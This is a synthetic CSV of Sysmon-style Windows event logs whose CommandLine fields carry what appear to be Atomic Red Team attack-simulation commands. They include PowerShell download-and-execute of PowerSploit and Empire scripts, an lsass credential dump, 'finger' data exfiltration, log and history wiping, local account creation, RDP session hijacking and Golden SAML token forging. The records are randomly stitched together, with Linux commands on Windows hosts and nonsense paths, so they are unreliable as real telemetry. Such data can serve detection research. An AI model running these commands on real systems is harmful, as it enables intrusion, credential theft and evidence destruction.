EventID,EventType,ComputerName,User,ProcessID,ProcessName,CommandLine,LogonID,LogonGuid,SourceProcessID,SourceProcessName,SourceImage,DestinationProcessID,DestinationProcessName,DestinationImage,UtcTime
5,Process Terminate,email-71.underwood-brown.com,myoung,6893,nc.exe,"""sudo #{compiled_file} #{source_file}\n"",",954804,3806ab92-051b-441e-b712-9ef4b32cde0f,5162,taskmgr.exe,C:\Users\Public\agency..dll,5087,mimikatz.exe,C:\Windows\citizen..exe,2024-05-17T01:36:51.571345Z
1,Process Create,lt-42.adkins.com,villarrealshannon,8888,malware.exe,"""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-ForestTrust -Verbose\n"",",226941,68eca639-eae4-40d0-8d01-48e2309abf31,3126,cmd.exe,C:\Program Files\month..exe,8359,backdoor.exe,C:\Program Files\guy..exe,2024-05-17T01:36:51.571345Z
3,Network Connection,email-19.cook.info,samantha64,3803,malware.exe,"""#{regsvr32path}\\#{regsvr32name} /s /i \""#{dll_name}\""\n"",",415838,6db20a4f-24d6-4e3a-bd0a-aa00d09b7e69,5148,mimikatz.exe,C:\Windows\can..exe,9609,regsvr32.exe,C:\Program Files\role..exe,2024-05-17T01:36:51.571345Z
11,File Create,email-26.riley.com,acostaalexander,2381,explorer.exe,"""aws --no-sign-request s3 cp --recursive s3://#{s3_bucket_name} /tmp/#{s3_bucket_name}\n"",",640687,f74e0f6c-eaa2-4948-b4f4-e5b1f846c627,7411,malware.exe,C:\Windows\raise..exe,5311,taskmgr.exe,C:\Program Files\ever..exe,2024-05-17T01:36:51.571345Z
1,Process Create,email-74.ortiz-coleman.org,coleanthony,6369,rundll32.exe,"""bcdedit /set testsigning on"",",243890,5c7d7a65-f717-4a50-bb31-4b1342ec95df,1125,mimikatz.exe,C:\Program Files\program..exe,9453,explorer.exe,C:\Program Files\reason..exe,2024-05-17T01:36:51.571345Z
7,Image Load,lt-63.stephenson-howard.com,sgray,8412,explorer.exe,"""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\niex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1 -UseBasicParsing)\nInvoke-AllChecks\n"",",217563,c53e7859-d867-4b0f-8ced-ac244a99c793,6576,taskmgr.exe,C:\Users\Public\old..exe,9052,malware.exe,C:\Program Files\Democrat..dll,2024-05-17T01:36:51.571345Z
11,File Create,laptop-84.harris.com,flee,6468,taskmgr.exe,"""osascript -e 'tell application \""Terminal\"" to do script \""tor\""'\n"",",943809,fbe75fc3-99b2-4f43-b7b7-8af37a861cf7,1878,rundll32.exe,C:\Program Files\run..dll,5950,cmd.exe,C:\Windows\including..exe,2024-05-17T01:36:51.571345Z
7,Image Load,db-91.chavez.com,zhunter,8304,backdoor.exe,"""cp $HISTFILE $HISTFILE.OLD\nif ((${#HISTFILE[@]})); then echo $HISTFILE; fi\necho \""\"" > $HISTFILE\nif [ $(wc -c <$HISTFILE) -gt 1 ]; then echo \""$HISTFILE is larger than 1k\""; fi\nls -la $HISTFILE \ncat $HISTFILE\nhistory -c \nif [ $(history |wc -l) -eq 1 ]; then echo \""History cache cleared\""; fi\n"",",563145,c9118817-3d11-4615-ba24-4565d578a32e,9091,cmd.exe,C:\Users\Public\major..exe,2635,cmd.exe,C:\Users\Public\benefit..exe,2024-05-17T01:36:51.571345Z
1,Process Create,laptop-84.morgan-robbins.com,rlee,4215,regsvr32.exe,"""start \""\"" #{browser} --headless --disable-gpu https://mockbin.org/bin/#{bin_id}\n"",",590582,b44928db-0ac4-440f-bfa9-0e55e42c5999,6622,regsvr32.exe,C:\Users\Public\nearly..exe,9471,rundll32.exe,C:\Program Files\maintain..exe,2024-05-17T01:36:51.572801Z
11,File Create,web-64.davis.com,ohebert,5745,nc.exe,"""find /usr/bin -perm -4000\n"",",365735,34543b51-a83e-4087-a743-5469f76c3a91,1914,mimikatz.exe,C:\Users\Public\no..exe,8976,mimikatz.exe,C:\Users\Public\around..dll,2024-05-17T01:36:51.572801Z
1,Process Create,laptop-71.jacobs.com,kbowen,4558,explorer.exe,"""rundll32.exe url.dll,OpenURL \""PathToAtomicsFolder\\T1218.011\\src\\index.hta\""\nrundll32.exe URL.dll,FileProtocolHandler \""PathToAtomicsFolder\\T1218.011\\src\\akteullen.vbs\""\n"",",674152,7656cc26-cdfe-49f6-a20f-9de763a8ea90,4449,rundll32.exe,C:\Program Files\finally..dll,4990,cmd.exe,C:\Program Files\with..dll,2024-05-17T01:36:51.572801Z
11,File Create,email-56.gonzalez.org,bcarlson,7145,mimikatz.exe,"""uname -a >> #{output_file}\nif [ -f /etc/lsb-release ]; then cat /etc/lsb-release >> #{output_file}; fi\nif [ -f /etc/redhat-release ]; then cat /etc/redhat-release >> #{output_file}; fi   \nif [ -f /etc/issue ]; then cat /etc/issue >> #{output_file}; fi\nif [ -f /etc/os-release ]; then cat /etc/os-release >> #{output_file}; fi\nuptime >> #{output_file}\ncat #{output_file} 2>/dev/null\n"",",989155,6c9518c9-752d-4bfe-8b12-bea417e552d4,6378,powershell.exe,C:\Users\Public\produce..exe,7213,powershell.exe,C:\Program Files\left..exe,2024-05-17T01:36:51.572801Z
3,Network Connection,srv-26.reid-russell.info,gsalinas,5326,regsvr32.exe,"""rundll32.exe #{dll_file},krnl\n"",",607290,36978c14-1e56-4cdd-af4f-ca3696b0222f,9015,cmd.exe,C:\Windows\fly..exe,7613,rundll32.exe,C:\Users\Public\agency..exe,2024-05-17T01:36:51.572801Z
3,Network Connection,desktop-69.soto.com,bethanyjames,2247,rundll32.exe,"""NET USE * '#{remote_path}' /TRANSPORT:QUIC /SKIPCERTCHECK\ncopy '#{local_file}' '*:\\'\n"",",101201,dae95ae6-0066-40a9-8432-68c57ccd8962,7545,explorer.exe,C:\Windows\list..dll,3568,explorer.exe,C:\Windows\onto..exe,2024-05-17T01:36:51.573799Z
7,Image Load,lt-62.moore.com,josegarcia,2430,explorer.exe,"""wmic process get caption,executablepath,commandline /format:csv\n"",",790021,381cfb2f-85bb-4fba-a408-aefc79dd2013,7105,regsvr32.exe,C:\Users\Public\all..dll,2295,rundll32.exe,C:\Program Files\shoulder..dll,2024-05-17T01:36:51.573799Z
11,File Create,laptop-18.jones-martinez.biz,jamesbooth,6702,cmd.exe,"""reg add \""HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows NT\\Terminal Services\"" /v \""DisableRemoteDesktopAntiAlias\"" /t REG_DWORD /d 1 /f\n"",",547223,c64ec8f4-67bb-4b61-a52b-dc6ab6428d7a,9403,explorer.exe,C:\Users\Public\pay..dll,6109,explorer.exe,C:\Users\Public\believe..exe,2024-05-17T01:36:51.573799Z
5,Process Terminate,web-16.tapia-moore.org,blewis,7301,cmd.exe,"""finger base64_filedata@#{remote_host}\n"",",638776,bb6eb7b6-d458-4fcd-8021-b9d677dcd64f,5173,rundll32.exe,C:\Users\Public\federal..exe,5250,taskmgr.exe,C:\Users\Public\material..dll,2024-05-17T01:36:51.573799Z
5,Process Terminate,email-12.beltran.com,clementsstephen,3859,explorer.exe,"""Set-Location \""PathToAtomicsFolder\""\n.\\T1572\\src\\T1572-doh-beacon.ps1 -DohServer #{doh_server} -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}\n"",",859954,570572b7-bd29-4c7f-bfab-f5f35031c9ce,6159,regsvr32.exe,C:\Users\Public\recognize..dll,3155,rundll32.exe,C:\Program Files\receive..exe,2024-05-17T01:36:51.573799Z
7,Image Load,email-59.williams-collins.com,leonard20,7437,mimikatz.exe,"""bash -c 'trap \""nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh\"" SIGINT && kill -SIGINT $$'\n"",",282729,5cdc7ff6-a3c8-4f26-a98d-9bcc10f47c68,7001,explorer.exe,C:\Windows\lawyer..exe,7998,backdoor.exe,C:\Windows\manage..exe,2024-05-17T01:36:51.574798Z
7,Image Load,web-51.hill.info,katelyn78,1432,mimikatz.exe,"""net.exe stop #{service_name}\n"",",637553,590e129e-130b-459a-a2c5-a297944ed4c6,2249,nc.exe,C:\Windows\building..exe,9791,regsvr32.exe,C:\Users\Public\operation..dll,2024-05-17T01:36:51.574798Z
7,Image Load,email-21.hall.com,hinessarah,1222,regsvr32.exe,"""sc sdset VSS D:(D;;GA;;;NU)(D;;GA;;;WD)(D;;GA;;;AN)S:(AU;FA;GA;;;WD)(AU;OIIOFA;GA;;;WD)\n"",",151092,12bf95ad-3eff-4f2b-864b-19e83c17762f,4078,mimikatz.exe,C:\Windows\heart..exe,8111,regsvr32.exe,C:\Windows\Republican..exe,2024-05-17T01:36:51.574798Z
3,Network Connection,email-40.monroe.com,hopkinsnicholas,6943,cmd.exe,"""security import #{cert_export} -k\n"",",231910,3aa9153b-9504-4b28-8b1c-45eb9ca2db6a,2366,regsvr32.exe,C:\Program Files\necessary..dll,8109,backdoor.exe,C:\Users\Public\from..exe,2024-05-17T01:36:51.574798Z
5,Process Terminate,srv-39.anderson-taylor.com,shawcharles,2796,malware.exe,"""Import-Module AADInternals -Force\n$saml = New-AADIntSAMLToken -ImmutableID \""#{immutable_id}\"" -PfxFileName \""#{certificate_path}\"" -Issuer \""#{issuer_uri}\""\n$conn = Get-AADIntAccessTokenForAADGraph -SAMLToken $saml -SaveToCache\nif ($conn) { Write-Host \""`nSuccessfully connected as $($conn.User)\"" } else { Write-Host \""`nThe connection failed\"" }\nWrite-Host \""End of Golden SAML\""\n"",",522341,ef62d561-2af5-47c0-961d-2003fdc0c895,1581,malware.exe,C:\Users\Public\send..exe,4609,backdoor.exe,C:\Program Files\while..dll,2024-05-17T01:36:51.574798Z
5,Process Terminate,lt-15.reyes-rodriguez.com,mware,1293,explorer.exe,"""REG ADD \""HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\AtomicSafeMode\"" /VE /T REG_SZ /F /D \""Service\""\n"",",391476,4c74eec3-c9b2-4112-a4f5-da3cc2a2d7d0,3902,mimikatz.exe,C:\Users\Public\learn..exe,7495,regsvr32.exe,C:\Windows\air..exe,2024-05-17T01:36:51.575799Z
11,File Create,laptop-87.pennington-bowers.net,vcross,7502,nc.exe,"""mkdir -p #{test_folder}\ncd #{test_folder}; touch a b c d e f g\nzip --password \""#{encryption_password}\"" #{test_folder}/#{test_file} ./*\necho \""#{encryption_password}\"" | gpg --batch --yes --passphrase-fd 0 --output #{test_folder}/#{test_file}.zip.gpg -c #{test_folder}/#{test_file}.zip\nls -l #{test_folder}\n"",",329222,271d7f98-f622-4df1-bdbf-ae8c3be93377,7356,regsvr32.exe,C:\Program Files\party..exe,3075,nc.exe,C:\Users\Public\research..dll,2024-05-17T01:36:51.575799Z
5,Process Terminate,email-48.scott-hansen.biz,ujohnson,5309,rundll32.exe,"""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"" -UseBasicParsing)\nInvoke-Maldoc -macroFile \""PathToAtomicsFolder\\T1070.001\\src\\T1070.001-macrocode.txt\"" -officeProduct \""Word\"" -sub \""ClearLogs\""\n"",",547545,748ef662-a7d4-4ae4-afd4-64e702b51601,3443,nc.exe,C:\Program Files\happen..exe,4615,taskmgr.exe,C:\Program Files\edge..dll,2024-05-17T01:36:51.575799Z
11,File Create,email-97.romero.com,ywebster,2330,explorer.exe,"""tasklist.exe\nsc query\nsc query state= all\n"",",178107,0f650d94-57e1-430d-b5d7-1b5b031a0bac,8850,taskmgr.exe,C:\Program Files\medical..dll,3186,rundll32.exe,C:\Program Files\question..dll,2024-05-17T01:36:51.575799Z
1,Process Create,laptop-39.myers.com,dleonard,5393,powershell.exe,"""reg add \""HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\"" /v ProxyServer /t REG_SZ /d \""proxy.atomic-test.com:8080\"" /f\n"",",421986,4eb4e1a3-555a-49bf-8477-bc6736c16c74,1980,taskmgr.exe,C:\Users\Public\current..exe,5681,mimikatz.exe,C:\Windows\night..exe,2024-05-17T01:36:51.575799Z
11,File Create,web-48.hodges-thomas.biz,michaelharmon,3895,malware.exe,"""C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:#{output_file} \""#{input_file}\""\n"",",214411,057de981-1e6f-4d60-90ad-a3a311fd9861,6994,cmd.exe,C:\Program Files\industry..dll,9468,cmd.exe,C:\Windows\choice..dll,2024-05-17T01:36:51.576807Z
11,File Create,email-10.gonzales-berger.net,janderson,5612,mimikatz.exe,"""Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \""#{password}\"" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \""#{username}\"", $Pword\nConnect-AzureAD -Credential $Credential\n\n$user = Get-AzureADUser -Filter \""DisplayName eq '#{user_principal_name}' or UserPrincipalName eq '#{user_principal_name}'\""\nif ($user -eq $null) { Write-Warning \""User not found\""; exit }\n$role = Get-AzureADDirectoryRole -Filter \""DisplayName eq '#{role_name}'\""\nif ($role -eq $null) { Write-Warning \""Role not found\""; exit }\nAdd-AzureADDirectoryRoleMember -ObjectId $role.ObjectId -RefObjectId $user.ObjectId\nWrite-Host \""User $($user.DisplayName) was added to $($role.DisplayName) role\""\n"",",281842,b1b32b84-da56-416a-820a-8763b4e98e24,2930,nc.exe,C:\Program Files\natural..exe,2872,rundll32.exe,C:\Program Files\push..exe,2024-05-17T01:36:51.576807Z
7,Image Load,lt-75.boyer-banks.org,jasmine96,9259,backdoor.exe,"""New-Item -Path #{teamviewer_log_file} -Force | Out-Null\nRemove-Item #{teamviewer_log_file} -Force -ErrorAction Ignore\n"",",991771,2262f766-2aba-436e-acc5-7d77a71a15de,1635,malware.exe,C:\Program Files\professor..dll,8406,backdoor.exe,C:\Windows\knowledge..dll,2024-05-17T01:36:51.576807Z
5,Process Terminate,laptop-37.brady-wood.info,nicholas85,3286,explorer.exe,"""reg add \""HKCU\\Software\\Policies\\Microsoft\\Windows\\OOBE\"" /v DisablePrivacyExperience /t REG_DWORD /d 1 /f\n"",",782405,a91bede7-ef30-45fc-b570-6fa70ff364b5,2277,powershell.exe,C:\Program Files\its..dll,9544,malware.exe,C:\Program Files\treatment..dll,2024-05-17T01:36:51.576807Z
7,Image Load,email-42.ross-moore.com,gallegosanne,1619,malware.exe,"""docker build -t t1610 $PathtoAtomicsFolder/T1610/src/\ndocker run --name t1610_container --rm -itd t1610 bash /tmp/script.sh\n"",",226974,442061e9-f75f-43f0-a4ad-d5beeb969e33,8351,nc.exe,C:\Windows\arm..dll,4218,backdoor.exe,C:\Windows\still..exe,2024-05-17T01:36:51.576807Z
7,Image Load,lt-59.potter.com,billycook,4542,malware.exe,"""cscript \""#{jscript}\"" > %tmp%\\T1059.007.out.txt\n"",",428133,d01e89d8-3f5c-4426-80f6-f8269ec945df,8095,cmd.exe,C:\Program Files\give..dll,2626,taskmgr.exe,C:\Windows\computer..dll,2024-05-17T01:36:51.577798Z
5,Process Terminate,srv-81.ellis.net,joy84,3690,backdoor.exe,"""query user\nsc.exe create sesshijack binpath= \""cmd.exe /k tscon #{Session_ID} /dest:#{Destination_ID}\""\nnet start sesshijack\n"",",287580,5e1a3f6d-eadf-44da-b199-e4f937fe6c4b,5911,mimikatz.exe,C:\Windows\include..exe,9185,malware.exe,C:\Users\Public\officer..exe,2024-05-17T01:36:51.577798Z
3,Network Connection,db-25.anderson.com,veronicarichards,8130,nc.exe,"""$exePath =  resolve-path \""$env:ProgramFiles\\dotnet\\shared\\Microsoft.NETCore.App\\5*\\createdump.exe\""\n& \""$exePath\"" -u -f $env:Temp\\dotnet-lsass.dmp (Get-Process lsass).id\n"",",632266,93fc0086-9458-42fa-91a6-b68b5b88361e,1675,taskmgr.exe,C:\Program Files\read..dll,9706,malware.exe,C:\Program Files\newspaper..dll,2024-05-17T01:36:51.577798Z
1,Process Create,srv-38.davis-williams.com,cervantesjessica,7473,explorer.exe,"""invoke-expression 'cmd /c start powershell -Command {cmd /c \""#{TorExe}\""}'\nsleep -s 60\nstop-process -name \""tor\"" | out-null\n"",",515417,eb839d9f-d954-40a8-865f-4684fce35c42,1663,explorer.exe,C:\Windows\technology..exe,9337,taskmgr.exe,C:\Windows\fast..exe,2024-05-17T01:36:51.577798Z
1,Process Create,web-00.mcpherson.com,ofields,3818,powershell.exe,"""Remove-Item -Path (Join-Path \""$Env:SystemRoot\\prefetch\\\"" (Get-ChildItem -Path \""$Env:SystemRoot\\prefetch\\*.pf\"" -Name)[0])\n"",",272918,26054769-f354-4baa-bc6d-991dd7d8f4ec,3875,taskmgr.exe,C:\Windows\final..exe,4436,malware.exe,C:\Users\Public\management..dll,2024-05-17T01:36:51.577798Z
3,Network Connection,web-10.walsh.com,mackcindy,2704,backdoor.exe,"""net user $ ATOMIC123! /add /active:yes"",",391225,ba98eba1-eea8-45a5-9a3d-c07231274910,7354,explorer.exe,C:\Program Files\end..exe,2259,mimikatz.exe,C:\Users\Public\must..dll,2024-05-17T01:36:51.578800Z
11,File Create,laptop-68.banks.com,ybrown,5925,rundll32.exe,"""reg add \""HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters\"" /v AllowEncryptionOracle /t REG_DWORD /d 2 /f\n"",",366011,7ff115ef-13e0-4188-b656-ff4b4b3e499c,9388,explorer.exe,C:\Windows\gun..exe,5201,rundll32.exe,C:\Program Files\anything..exe,2024-05-17T01:36:51.578800Z
1,Process Create,srv-61.mcintyre-mccoy.biz,bennettfelicia,7786,backdoor.exe,"""sudo modprobe #{rootkit_name}\nping -c 10 localhost >/dev/null & TARGETPID=\""$!\""\nps $TARGETPID\nkill -31 $TARGETPID\nps $TARGETPID || echo \""process ${TARGETPID} hidden\""\n"",",248596,164f07fe-2100-408d-8770-123890cc4b86,3138,explorer.exe,C:\Users\Public\hotel..dll,5996,malware.exe,C:\Program Files\method..exe,2024-05-17T01:36:51.578800Z
7,Image Load,desktop-21.adams.biz,alexandria63,5290,regsvr32.exe,"""$PathToAtomicsFolder\\T1055\\bin\\x64\\CreateThreadNative.exe -debug\n"",",806402,b2e57ce7-0abc-4166-bde5-e5c86875de6b,2540,cmd.exe,C:\Program Files\present..dll,2131,mimikatz.exe,C:\Program Files\despite..dll,2024-05-17T01:36:51.578800Z
11,File Create,lt-20.spencer.com,johnsonjose,6011,taskmgr.exe,"""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"" -UseBasicParsing) \nInvoke-MalDoc -macroFile \""PathToAtomicsFolder\\T1055.012\\src\\T1055.012-macrocode.txt\"" -officeProduct \""#{ms_product}\"" -sub \""Exploit\""\n"",",500669,199e371f-796a-4be9-ab0b-3c1b2029a7c9,4247,powershell.exe,C:\Program Files\easy..exe,1308,mimikatz.exe,C:\Users\Public\while..exe,2024-05-17T01:36:51.578800Z
11,File Create,srv-83.sanders.com,dgarcia,2858,rundll32.exe,"""powershell -nop -exec bypass -c \""IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); Get-DomainGPO\"""",",443481,f723ec4d-02d9-4303-bd5d-bf33b4f41e24,8175,malware.exe,C:\Program Files\speech..dll,9854,backdoor.exe,C:\Windows\with..exe,2024-05-17T01:36:51.579799Z
1,Process Create,db-88.austin-golden.com,ifranklin,8215,regsvr32.exe,"""Invoke-ATHHTMLApplication -TemplatePE -AsLocalUNCPath -MSHTAFilePath #{mshta_file_path}"",",459324,125a2945-d318-42b8-b2b5-18cd3ed2ec07,6625,rundll32.exe,C:\Users\Public\amount..exe,6787,regsvr32.exe,C:\Users\Public\open..exe,2024-05-17T01:36:51.579799Z
3,Network Connection,srv-94.burgess.com,ronald93,6568,cmd.exe,"""nscurl -k \""#{remote_file}\"" -o \""#{destination_path}\"""",",285729,efec7306-4ad7-4a9a-9e98-ecd2054f5707,1039,regsvr32.exe,C:\Program Files\difficult..dll,9385,cmd.exe,C:\Program Files\agreement..dll,2024-05-17T01:36:51.579799Z
1,Process Create,lt-53.weber.com,stephaniecrosby,8739,malware.exe,"""chmod -R #{symbolic_mode} #{file_or_folder}\n"",",697965,1cdfd6fc-d0a1-455c-9e2d-8f353fa09055,8130,mimikatz.exe,C:\Windows\reduce..exe,6380,malware.exe,C:\Users\Public\occur..dll,2024-05-17T01:36:51.579799Z
1,Process Create,laptop-06.hamilton.net,clucas,8454,malware.exe,"""DYLD_INSERT_LIBRARIES=#{dylib_file} #{file_to_inject}\n"",",540213,71c316f5-d113-4bd9-a452-7f2f5f83b996,9880,rundll32.exe,C:\Users\Public\history..dll,2693,mimikatz.exe,C:\Program Files\beautiful..exe,2024-05-17T01:36:51.579799Z
7,Image Load,web-74.rowe.com,davidgreen,7396,nc.exe,"""REG ADD \""HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\AtomicSafeMode\"" /VE /T REG_SZ /F /D \""Service\""\n"",",778679,bebfff4b-35d2-44a7-b7f2-ed70b56453d2,5606,mimikatz.exe,C:\Users\Public\give..dll,6594,powershell.exe,C:\Program Files\value..dll,2024-05-17T01:36:51.580802Z
11,File Create,desktop-79.johnson.info,smithmatthew,1066,cmd.exe,"""reg add \""HKCU\\Software\\Policies\\Microsoft\\Windows\\OOBE\"" /v DisablePrivacyExperience /t REG_DWORD /d 1 /f\n"",",184741,621644b2-71dd-45c7-95ce-d484f8218125,3698,powershell.exe,C:\Windows\type..exe,9888,backdoor.exe,C:\Users\Public\truth..exe,2024-05-17T01:36:51.580802Z
